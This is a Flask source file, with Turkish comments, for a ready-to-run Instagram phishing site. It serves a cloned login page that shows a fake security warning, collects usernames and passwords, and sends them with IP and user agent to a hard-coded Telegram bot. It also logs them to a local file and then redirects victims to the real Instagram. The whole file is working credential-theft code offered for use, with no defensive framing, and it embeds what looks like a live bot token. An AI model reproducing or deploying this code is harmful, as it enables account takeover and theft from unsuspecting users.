# app.py
from flask import Flask, request, render_template_string, jsonify
import requests
import json
from datetime import datetime

app = Flask(__name__)

# Telegram bot bilgileri
BOT_TOKEN = "8163118510:AAG_Tn89SXiRz1HQSmAHxYCO9U__OW8Sz78"
CHAT_ID = "8265958228"

def send_to_telegram(data):
    """Yakalanan verileri Telegram'a gönder"""
    try:
        message = f"""
🔰 <b>NABISYSTEM PHISHING HIT</b> 🔰

📧 <b>Kullanıcı Adı:</b> {data['username']}
🔑 <b>Şifre:</b> {data['password']}
🌐 <b>User Agent:</b> {data['user_agent'][:50]}...
🕒 <b>Zaman:</b> {data['timestamp']}
📍 <b>IP:</b> {request.remote_addr}

🚀 <i>Nabi System - Instagram Phishing</i>
        """
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        requests.post(url, data=payload)
        
        # Veriyi dosyaya da kaydet
        with open('credentials.txt', 'a', encoding='utf-8') as f:
            f.write(f"{datetime.now()} - {data['username']}:{data['password']}\n")
            
    except Exception as e:
        print(f"Telegram error: {e}")

# Instagram phishing HTML template
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram • Giriş Yap</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: #8EC4F7;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 380px;
        }

        .login-box {
            background: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 12px;
            padding: 40px 30px;
            text-align: center;
            margin-bottom: 15px;
            width: 100%;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
        }

        .instagram-logo {
            margin-bottom: 25px;
        }

        .instagram-logo img {
            height: 70px;
            width: auto;
            border-radius: 12px;
        }

        .login-form input {
            width: 100%;
            padding: 14px;
            margin-bottom: 10px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            font-size: 14px;
            color: #262626;
            transition: all 0.3s ease;
        }

        .login-form input::placeholder {
            color: #8e8e8e;
        }

        .login-form input:focus {
            outline: none;
            border-color: #8EC4F7;
            background: #ffffff;
            box-shadow: 0 0 0 2px rgba(142, 196, 247, 0.2);
        }

        .login-button {
            width: 100%;
            padding: 12px;
            background: #8EC4F7;
            border: none;
            border-radius: 8px;
            color: #ffffff;
            font-weight: 600;
            font-size: 15px;
            margin: 20px 0;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .login-button:hover {
            background: #7BB4F5;
            transform: translateY(-1px);
        }

        .separator {
            display: flex;
            align-items: center;
            margin: 25px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .separator::before,
        .separator::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }

        .separator span {
            padding: 0 15px;
        }

        .facebook-login {
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
            padding: 10px;
            border: none;
            border-radius: 8px;
            transition: all 0.3s ease;
        }

        .facebook-login:hover {
            color: #2d4373;
            text-decoration: underline;
        }

        .facebook-login i {
            margin-right: 8px;
            font-size: 18px;
        }

        .forgot-password {
            color: #00376b;
            font-size: 13px;
            text-decoration: none;
            font-weight: 500;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .signup-box {
            background: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 12px;
            padding: 25px;
            text-align: center;
            margin-bottom: 20px;
            width: 100%;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
        }

        .signup-box span {
            color: #262626;
        }

        .signup-box a {
            color: #8EC4F7;
            font-weight: 600;
            text-decoration: none;
        }

        .signup-box a:hover {
            text-decoration: underline;
            color: #7BB4F5;
        }

        .download-app {
            text-align: center;
            width: 100%;
        }

        .download-app p {
            margin-bottom: 15px;
            font-size: 14px;
            color: #262626;
            font-weight: 500;
        }

        .app-buttons {
            display: flex;
            justify-content: center;
            gap: 10px;
        }

        .app-buttons img {
            height: 45px;
            border-radius: 8px;
            transition: transform 0.3s ease;
        }

        .app-buttons img:hover {
            transform: scale(1.05);
        }

        .footer {
            width: 100%;
            margin-top: 40px;
            text-align: center;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 12px;
            margin-bottom: 15px;
        }

        .footer-links a {
            color: #262626;
            font-size: 12px;
            text-decoration: none;
            transition: color 0.3s ease;
        }

        .footer-links a:hover {
            color: #8EC4F7;
            text-decoration: underline;
        }

        .copyright {
            color: #8e8e8e;
            font-size: 12px;
        }

        /* Security Notice */
        .security-notice {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 10px;
            padding: 15px;
            margin: 20px 0;
            text-align: center;
        }

        .security-notice h3 {
            color: #856404;
            margin-bottom: 8px;
            font-size: 14px;
            font-weight: 600;
        }

        .security-notice p {
            color: #664d03;
            font-size: 12px;
            line-height: 1.4;
            margin: 0;
        }

        /* Loading Animation */
        .loading {
            display: none;
            text-align: center;
            margin: 15px 0;
        }

        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #8EC4F7;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Responsive Design */
        @media (max-width: 450px) {
            .login-box {
                padding: 30px 20px;
                border-radius: 10px;
            }
            
            .signup-box {
                padding: 20px;
                border-radius: 10px;
            }
            
            body {
                padding: 15px;
                background: #8EC4F7;
            }

            .instagram-logo img {
                height: 60px;
            }
        }

        /* Additional styling for better appearance */
        .login-box h2 {
            color: #262626;
            font-size: 16px;
            margin-bottom: 20px;
            font-weight: 400;
        }

        .loading p {
            color: #262626;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="instagram-logo">
                <img src="https://i.ibb.co/JwdcHSBc/Screenshot-2025-11-23-121645.jpg" alt="Instagram">
            </div>
            
            <h2>Bilgilerinizi girerek giriş yapın</h2>
            
            <form class="login-form" id="loginForm">
                <input type="text" id="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
                <input type="password" id="password" placeholder="Şifre" required>
                
                <div class="security-notice">
                    <h3>🔒 Güvenlik Kontrolü</h3>
                    <p>Hesabınıza şüpheli giriş tespit edildi. Lütfen bilgilerinizi doğrulayın.</p>
                </div>
                
                <button type="submit" class="login-button" id="loginButton">Giriş Yap</button>
                
                <div class="loading" id="loading">
                    <div class="spinner"></div>
                    <p>Güvenlik kontrolü yapılıyor...</p>
                </div>
            </form>

            <div class="separator">
                <span>VEYA</span>
            </div>

            <a href="#" class="facebook-login">
                <i>📘</i> Facebook ile Giriş Yap
            </a>

            <a href="#" class="forgot-password">Şifreni mi unuttun?</a>
        </div>

        <div class="signup-box">
            <span>Hesabın yok mu? </span>
            <a href="#">Kaydol</a>
        </div>

        <div class="download-app">
            <p>Uygulamayı indir.</p>
            <div class="app-buttons">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_tr-tr.png/4b70f6fae447.png" alt="App Store">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_tr-tr.png/2f2a0c05b2f3.png" alt="Google Play">
            </div>
        </div>

        <div class="footer">
            <div class="footer-links">
                <a href="#">Hakkında</a>
                <a href="#">Yardım</a>
                <a href="#">Basın</a>
                <a href="#">API</a>
                <a href="#">İş Fırsatları</a>
                <a href="#">Gizlilik</a>
                <a href="#">Koşullar</a>
                <a href="#">Konumlar</a>
                <a href="#">Dil</a>
            </div>
            <div class="copyright">
                © 2024 Instagram from Meta
            </div>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const loginButton = document.getElementById('loginButton');
            const loading = document.getElementById('loading');
            
            // Giriş butonunu gizle, loading göster
            loginButton.style.display = 'none';
            loading.style.display = 'block';
            
            // Verileri backend'e gönder
            fetch('/log_credentials', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    username: username,
                    password: password,
                    user_agent: navigator.userAgent,
                    timestamp: new Date().toISOString(),
                    ip: '' // Backend'de alınacak
                })
            })
            .then(response => response.json())
            .then(data => {
                // Başarılı gibi göster, sonra Instagram'a yönlendir
                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com/accounts/login/';
                }, 2000);
            })
            .catch(error => {
                console.error('Error:', error);
                // Hata durumunda da Instagram'a yönlendir
                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com/accounts/login/';
                }, 2000);
            });
        });

        // Fake loading for Facebook login
        document.querySelector('.facebook-login').addEventListener('click', function(e) {
            e.preventDefault();
            alert('Facebook girişi geçici olarak kullanılamıyor. Lütfen normal giriş yapın.');
        });

        // Input focus effects
        const inputs = document.querySelectorAll('input');
        inputs.forEach(input => {
            input.addEventListener('focus', function() {
                this.style.background = '#ffffff';
                this.style.borderColor = '#8EC4F7';
            });
            
            input.addEventListener('blur', function() {
                this.style.background = '#fafafa';
                this.style.borderColor = '#dbdbdb';
            });
        });
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    """Ana sayfa - Instagram phishing page"""
    return render_template_string(HTML_TEMPLATE)

@app.route('/log_credentials', methods=['POST'])
def log_credentials():
    """Yakalanan credentials'leri kaydet"""
    try:
        data = request.json
        send_to_telegram(data)
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
